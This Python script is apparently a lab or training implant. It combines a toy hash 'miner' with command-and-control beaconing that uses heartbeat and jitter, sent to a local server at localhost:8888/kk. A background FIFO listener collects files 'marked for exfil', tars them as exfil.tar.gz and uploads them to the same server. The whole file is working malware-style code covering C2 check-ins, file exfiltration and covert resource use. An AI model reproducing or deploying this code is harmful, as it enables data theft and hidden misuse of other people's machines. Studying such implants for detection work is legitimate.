import uuid
import datetime
import hashlib
import string
import time
import requests
from random import choice, randint
from collections import deque
import tarfile
import os
import threading
import json

# below value should be 0 (CPU @ ~20%) or 1 (CPU quiet, slows payoff)
target = 3000000000000000000000000000000000000000000000  # just for testing


global processingLevel
processingLevel = 0.1  # time to sleep between hashes (in seconds)

PIPE = "/tmp/fifo"  # FIFO path for file exfiltration


class PhoneHome:
    heartbeat = 30
    jitter = 15
    home_url = "http://localhost:8888/kk"
    # home_url = 'http://192.168.37.129:8888/kk'

    def __init__(self):
        super().__init__()

    def CallHome(self, MinerID):  # heartbeat check-in with C2
        payload = {"miner_id": MinerID}
        r = requests.post(self.home_url + "/beacon", json=payload)
        if r.status_code != 200:
            raise ValueError(r.json())
        p = r.json()
        PhoneHome.heartbeat = p["h"]
        PhoneHome.jitter = p["j"]

    def CallCoin(self, CoinResult, MinerID):  # send a coin result to bank
        payload = {"miner_id": MinerID, "coin_result": CoinResult}
        requests.post(self.home_url + "/coin", json=payload)

    def NewTime(self):  # get the next C2 check-in time
        current_time = datetime.datetime.now()
        # add or subtract jitter
        seed = randint(0, 1)
        if seed == 0:
            offset = PhoneHome.heartbeat - randint(0, PhoneHome.jitter)
        else:
            offset = PhoneHome.heartbeat + randint(0, PhoneHome.jitter)
        # use offset to establish next check in
        return_time = current_time + datetime.timedelta(seconds=offset)
        return return_time


class Coin:
    def __init__(self, level):
        self.processingLevel = level

    def Mine(self):  # generate a random string and get its hash digest
        allchar = string.ascii_letters + string.punctuation + string.digits
        miningSeed = "".join(choice(allchar) for x in range(randint(1, 20)))
        miningDigest = hashlib.sha1((miningSeed).encode("utf-8"))
        time.sleep(self.processingLevel)
        return miningDigest

    def Compare(self, target, miningDigest):  # compare mining try to reference value
        CoinTry = int(miningDigest.hexdigest(), miningDigest.digest_size)
        if CoinTry < target:
            result = 1
        else:
            result = 0
        return result


class FileStack:
    def __init__(self, idle_timeout=60):
        self.stack = deque()
        self.last_activity = datetime.datetime.now()
        self.idle_timeout = idle_timeout
        self.i = 0

    def add_file(self, path):
        self.stack.append(path)
        self.last_activity = datetime.datetime.now()

    def is_idle(self):
        return (
            datetime.datetime.now() - self.last_activity
        ).seconds > self.idle_timeout

    def bundle_files(self, out_path="exfil.tar.gz"):
        out_path = f"{self.i}" + out_path
        with tarfile.open(out_path, "w:gz") as tar:
            while self.stack:
                f = self.stack.popleft()
                if os.path.isfile(f):
                    tar.add(f, arcname=os.path.basename(f))
        self.i += 1
        return out_path


file_buffer = FileStack(idle_timeout=10)


def watch_and_bundle(mid):
    while True:
        time.sleep(5)
        print("Checking for idle state...")
        if file_buffer.is_idle() and file_buffer.stack:
            archive = file_buffer.bundle_files()
            print(f"Bundled files to {archive}, sending to server...")
            with open(archive, "rb") as f:
                files = {
                    "upload": (archive, f, "application/gzip"),
                    "metadata": (None, json.dumps({"uuid": mid})),
                }
                requests.post(
                    "http://localhost:8888/kk/upload",
                    files=files,
                )
            os.remove(archive)


def fifo_listener(pipe_path, file_buffer):
    print(f"[+] Starting FIFO listener on {pipe_path}")
    if not os.path.exists(pipe_path):
        os.mkfifo(pipe_path)
        print(f"[+] FIFO created at {pipe_path}")

    print(f"[+] Listening to FIFO at {pipe_path}")
    while True:
        with open(pipe_path, "r") as pipe:
            for line in pipe:
                filepath = line.strip()
                if os.path.isfile(filepath):
                    print(f"[+] Marked for exfil: {filepath}")
                    file_buffer.add_file(filepath)
                else:
                    print(f"[-] Not a file or doesn't exist: {filepath}")


def main():
    GetNewParams = 1
    app = PhoneHome()
    MinerID = uuid.uuid4().hex
    Mine = Coin(level=processingLevel)
    threading.Thread(
        target=watch_and_bundle,
        args=(MinerID,),
        daemon=True,
    ).start()
    threading.Thread(
        target=fifo_listener,
        args=(PIPE, file_buffer),
        daemon=True,
    ).start()

    while True:
        checkpoint = datetime.datetime.now()

        if GetNewParams == 1:
            check_in = app.NewTime()
            GetNewParams = 0
            app.CallHome(str(MinerID))

        if checkpoint > check_in:
            GetNewParams = 1
        else:
            CoinResult = Mine.Mine()

        if Mine.Compare(target, CoinResult) == 1:
            app.CallCoin(CoinResult.hexdigest(), MinerID)


if __name__ == "__main__":
    main()
